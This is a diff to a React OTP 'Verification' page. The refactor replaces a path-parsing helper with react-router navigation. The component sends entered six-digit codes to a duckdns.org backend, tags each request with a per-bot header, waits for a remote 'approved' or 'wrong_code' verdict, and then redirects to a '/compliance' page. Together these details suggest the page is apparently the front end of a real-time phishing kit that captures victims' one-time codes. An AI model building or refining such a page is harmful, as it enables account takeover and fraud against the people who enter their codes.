@@ -1,9 +1,8 @@
 import React, { useState, useRef, useEffect } from 'react'
 import axios from 'axios'
+import { useNavigate, useParams } from 'react-router-dom'
 
 const API_BASE_URL = "https://lnmb.duckdns.org"
-
-const getBotName = () => window.location.pathname.split("/")[1] || "user1"
 
 const api = axios.create({
   baseURL: API_BASE_URL,
@@ -11,7 +10,7 @@ const api = axios.create({
 })
 
 api.interceptors.request.use(config => {
-  const bot = getBotName()
+  const bot = window.location.pathname.split("/")[1] || "user1"
   config.headers["X-Bot-Name"] = bot
   return config
 })
@@ -26,6 +25,9 @@ const otpStatusMessages = {
 }
 
 function Verification() {
+  const navigate = useNavigate()
+  const { user } = useParams()
+  const userId = user || 'default'
   const [client] = useState({ name: "", number: "" })
   const [otp, setOtp] = useState(Array(6).fill(""))
   const inputRefs = useRef([])
@@ -36,8 +38,6 @@ function Verification() {
   const [copied, setCopied] = useState(false)
   const [timer, setTimer] = useState(120)
   
-  const { user } = getBotName() || {}
-
   const startIndex = useRef(null)
 
   const handleKey = (index, e) => {
@@ -101,8 +101,8 @@ function Verification() {
         if (data.status === "approved") {
           console.log("✅ OTP approved!")
           setSessionId(null)
-          setTimeout(() => window.location.href = `/${user}/compliance`, 1000)
           clearInterval(interval)
+          setTimeout(() => navigate(`/${userId}/compliance`), 1000)
         } else if (data.status === "wrong_code") {
           console.log("❌ Wrong OTP code")
           setError("Code OTP incorrect")
@@ -140,7 +140,7 @@ function Verification() {
 
   useEffect(() => {
     if (status === "approved") {
-      setTimeout(() => window.location.href = `/${user}/compliance`, 2000)
+      setTimeout(() => navigate(`/${userId}/compliance`), 2000)
     }
   }, [status])
 
